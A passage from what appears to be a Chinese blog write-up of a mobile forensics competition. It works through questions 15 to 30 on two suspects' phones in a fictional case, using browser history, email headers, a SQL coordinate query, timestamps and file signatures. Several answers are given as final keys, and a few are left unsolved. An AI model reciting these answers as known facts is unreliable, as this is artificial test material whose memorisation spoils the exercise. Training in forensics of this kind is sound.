&lt;p&gt;&lt;strong&gt;B.城门畔塘径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C.大榄麦理浩径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D.京士柏卫理径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;看来上一题全部看一遍是正确的，我们能找到这样一张图片：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814102445543&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814102445543.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814102445543.png&#34; alt=&#34;image-20250814102445543&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;李大辉的phone15-24&#34;&gt;李大辉的Phone(15-24)
&lt;/h1&gt;&lt;h2 id=&#34;15李大辉使用的是一台lg-v10的手机它的型号是什么&#34;&gt;15.李大辉使用的是一台LG V10的手机，它的型号是什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. LGH960C&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. LGH961N&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. LGH960H&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. LGH961C&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E. LGH961D&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814111807409&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814111807409.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814111807409.png&#34; alt=&#34;image-20250814111807409&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;16李大辉的手机最常搜索的类别category-是什么&#34;&gt;16.李大辉的手机最常搜索的类别(Category) 是什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 护肤品&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 旅游&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 运动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 学校&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;查看chrome浏览器的历史记录，发现最多的是关于化妆品一类的：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814112129286&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814112129286.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814112129286.png&#34; alt=&#34;image-20250814112129286&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;A
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;17李大辉最近光顾了一家美丰快运公司这快递件的单号是什么不要输入符号及空白以阿拉伯数字回答&#34;&gt;17.李大辉最近光顾了一家美丰快运公司，这快递件的单号是什么?(不要输入符号及空白，以阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;这题不会&lt;/p&gt;
&lt;p&gt;先是看了一遍图片，没有找到快递相关的东西&lt;/p&gt;
&lt;p&gt;又跑到文件里面找图片，七千多张翻了二十多页，啥也没有，太耗时间了，还给我火眼整的卡卡的&lt;/p&gt;
&lt;p&gt;我想到耗时任务里面有图片文字提取，但是使用要苍穹ai引擎，而且也没有关键词，不一定好找&lt;/p&gt;
&lt;p&gt;接着又在浏览器里面找，还是没有快递相关，遂放弃&lt;/p&gt;
&lt;h2 id=&#34;18李大辉收到的电邮中有一个钓鱼链结phishing-link这个链结的地址是什么&#34;&gt;18.李大辉收到的电邮中有一个钓鱼链结(Phishing Link)，这个链结的地址是什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 以上皆非&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. &lt;a class=&#34;link&#34; href=&#34;https://bit.ly/3yeARcO&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://bit.ly/3yeARcO
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. &lt;a class=&#34;link&#34; href=&#34;https://bit.ly/5vM12&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://bit.ly/5vM12
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. &lt;a class=&#34;link&#34; href=&#34;http://bit.ly/Hell0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://bit.ly/Hell0
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在Gmail里面能找到：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814114714799&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814114714799.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814114714799.png&#34; alt=&#34;image-20250814114714799&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;19承上题这封电邮是从哪个电邮地址寄出的&#34;&gt;19.承上题，这封电邮是从哪个电邮地址寄出的?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 以上皆非&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. &lt;a class=&#34;link&#34; href=&#34;mailto:Cavinchow456@yahoo.com&#34; &gt;Cavinchow456@yahoo.com
    
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. &lt;a class=&#34;link&#34; href=&#34;mailto:2020ChanChan@hotmail.com&#34; &gt;2020ChanChan@hotmail.com
    
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. &lt;a class=&#34;link&#34; href=&#34;mailto:30624700Peter@proton.me&#34; &gt;30624700Peter@proton.me
    
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同上题图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;20承上题寄出这封电邮的ip地址是&#34;&gt;20.承上题，寄出这封电邮的IP地址是?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 以上皆非&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 65.54.185.39&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 10.13.105.56&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 58.152.110.218&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这题我也不知道怎么做，查看了Gmail的&lt;/p&gt;
&lt;p&gt;不过10开头的好像是内网地址，不能在公网上路由？那也只能排除C&lt;/p&gt;
&lt;h2 id=&#34;21李大辉手机有一个orderxlsx-的档案被加密了解密钥匙是什么&#34;&gt;21.李大辉手机有一个order.xlsx 的档案被加密了，解密钥匙是什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 2022 Nov!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 20221101&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. Nov2022!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. P@sswOrd!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这一题答案在图片中，或许应该庆幸十七题我把所有图片都看了一遍：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814115556797&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814115556797.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814115556797.png&#34; alt=&#34;image-20250814115556797&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不过这个选择题就四个选项，找到加密文件全部试一遍也试出来了，有点意义不明&lt;/p&gt;
&lt;h2 id=&#34;22香港的街道上每一枝街灯都有编号分析李大辉手机里的程序-kmb-1933-哪一枝街灯在经度-latitude-224160270000-纬度-longitude-1142139450000-附近它的编号是什么以大㝍英文及阿拉伯数字回答&#34;&gt;22.香港的街道上每一枝街灯都有编号。分析李大辉手机里的程序 &amp;lsquo;KMB 1933&amp;rsquo;， 哪一枝街灯在经度 (Latitude) 22.4160270000， 纬度 (Longitude) 114.2139450000 附近，它的编号是什么?(以大㝍英文及阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;和十二题一样，搜索KMB，在文件目录下找到数据库：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814121253302&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814121253302.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814121253302.png&#34; alt=&#34;image-20250814121253302&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;链接之后，找到kmb_routestopfile_ST表，只有这个表里面有经纬度：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814121239693&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814121239693.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814121239693.png&#34; alt=&#34;image-20250814121239693&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;sql进行模糊查询：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;kmb_routestopfile_ST&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;lat&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BETWEEN&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;22&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;416027&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;0005&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;22&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;416027&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;0005&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;lng&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BETWEEN&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;114&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;213945&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;0005&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;114&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;213945&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;0005&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ORDER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ABS&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;lat&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;22&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;416027&lt;/span&gt;) &lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ABS&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;lng&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;114&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;213945&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;LIMIT&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814121717560&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814121717560.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814121717560.png&#34; alt=&#34;image-20250814121717560&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CE1453
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;23李大辉的手机里有一张由该手机拍的照片照片的元资料metadata-曾被修改这张照片的档案名是什么以大写英文及数字回答不用回答副档名&#34;&gt;23.李大辉的手机里有一张由该手机拍的照片，照片的元资料(Metadata) 曾被修改，这张照片的档案名是什么?(以大写英文及数字回答，不用回答副档名
&lt;/h2&gt;&lt;p&gt;在Android.bin/分区57/media/0/DCIM/Camera路径下查看手机照片的创建时间和修改时间&lt;/p&gt;
&lt;p&gt;发现只有一张图片的c和m时间不一样：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814122126266&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814122126266.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814122126266.png&#34; alt=&#34;image-20250814122126266&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;20220922_152622.jpg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;24分析李大辉的手机里的资料他在哪一间公司工作&#34;&gt;24.分析李大辉的手机里的资料，他在哪一间公司工作?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 美丽好化妆品公司&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 步步高贸易公司&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 盛大国际有限公司&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 永恒化妆品公司&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;微信和whatsapp都没有相关工作消息，最后在文件的pdf中找到了职员证：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814122928297&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814122928297.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814122928297.png&#34; alt=&#34;image-20250814122928297&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;A
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;林浚熙的iphone25-38&#34;&gt;林浚熙的iphone(25-38)
&lt;/h1&gt;&lt;h2 id=&#34;25林浚熙曾经以手机登录google账户的验证码是什么不要输入符号以大写英文及阿拉伯数字回答&#34;&gt;25.林浚熙曾经以手机登录Google账户的验证码是什么?(不要输入符号，以大写英文及阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;翻阅短信：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814123330799&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814123330799.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814123330799.png&#34; alt=&#34;image-20250814123330799&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;G-785186
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;26林浚熙手机的-whatsapp-号码是什么号码swhatsappnet-以阿拉伯数字回答&#34;&gt;26.林浚熙手机的&amp;rsquo; WhatsApp&amp;rsquo; 号码是什么?(号码)@s.whatsapp.net? (以阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814123444032&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814123444032.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814123444032.png&#34; alt=&#34;image-20250814123444032&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;85259308538
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;27通过分析林浚熙手机的照片判断他在何处偷拍王晓琳&#34;&gt;27.通过分析林浚熙手机的照片，判断他在何处偷拍王晓琳?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 交通工具&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 郊野公园&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 游泳池&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 酒店房间&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;照片在之前王晓琳的聊天记录里面已经看到过，是酒店&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;28林浚熙曾经删掉自己拍摄的照片这张照片的档案名filename-是什么不要输入以大写英文及阿拉伯数字回答如cat10jpg需回答cat10jpg&#34;&gt;28.林浚熙曾经删掉自己拍摄的照片，这张照片的档案名(Filename) 是什么?(不要输入，以大写英文及阿拉伯数字回答。如Cat10.jpg，需回答CAT10JPG)
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814123842272&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814123842272.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814123842272.png&#34; alt=&#34;image-20250814123842272&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IMG_0444.JPG
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;29王晓琳曾经发送一个pdf档案予林浚熙这个档案的文件签名file-signature-是什么以十六进制数字答首八位数值如foa1c5e1&#34;&gt;29.王晓琳曾经发送一个PDF档案予林浚熙，这个档案的文件签名(File Signature) 是什么?(以十六进制数字答首八位数值，如FOA1C5E1)
&lt;/h2&gt;&lt;p&gt;在本地资源管理器找到这个pdf，随便一个十六进制编辑器打开：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814124731728&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814124731728.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814124731728.png&#34; alt=&#34;image-20250814124731728&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D0CF11E0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;30承上题该pdf档案内包含一位曾经被肩的受害者资料分析林熙手机的数据这位受害者的英文名字是什么不要输入符号及空白以大写英文回答&#34;&gt;30.承上题，该PDF档案内包含一位曾经被肩的受害者资料。分析林熙手机的数据，这位受害者的英文名字是什么?(不要输入符号及空白，以大写英文回答)
